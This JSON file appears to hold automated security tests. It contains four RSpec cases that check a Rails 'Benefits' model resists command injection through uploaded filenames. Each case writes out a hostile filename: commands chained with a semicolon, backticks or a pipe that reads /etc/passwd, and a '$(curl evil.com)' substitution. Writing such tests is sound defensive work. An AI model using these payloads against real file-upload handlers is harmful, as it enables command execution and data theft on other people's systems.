{
  "redTests": [
    {
      "testName": "command injection via semicolon in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via semicolon' do\n    file = double('file', original_filename: 'test.txt; touch /tmp/pwned', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(File).to receive(:exist?).with('/tmp/pwned').and_return(false)\n    Benefits.save(file, 'true')\n    expect(File.exist?('/tmp/pwned')).to be false\n  end\nend",
      "attackVector": "test.txt; touch /tmp/pwned",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via backticks in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via backticks' do\n    file = double('file', original_filename: 'test.txt`whoami > /tmp/exploit`', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(File).to receive(:exist?).with('/tmp/exploit').and_return(false)\n    Benefits.save(file, 'true')\n    expect(File.exist?('/tmp/exploit')).to be false\n  end\nend",
      "attackVector": "test.txt`whoami > /tmp/exploit`",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via pipe operator in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via pipe operator' do\n    file = double('file', original_filename: 'test.txt | cat /etc/passwd > /tmp/passwd', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(File).to receive(:exist?).with('/tmp/passwd').and_return(false)\n    Benefits.save(file, 'true')\n    expect(File.exist?('/tmp/passwd')).to be false\n  end\nend",
      "attackVector": "test.txt | cat /etc/passwd > /tmp/passwd",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via command substitution in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via command substitution' do\n    file = double('file', original_filename: 'test$(curl evil.com).txt', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(Benefits).not_to receive(:system).with(/curl/)\n    Benefits.save(file, 'true')\n  end\nend",
      "attackVector": "test$(curl evil.com).txt",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    }
  ]
}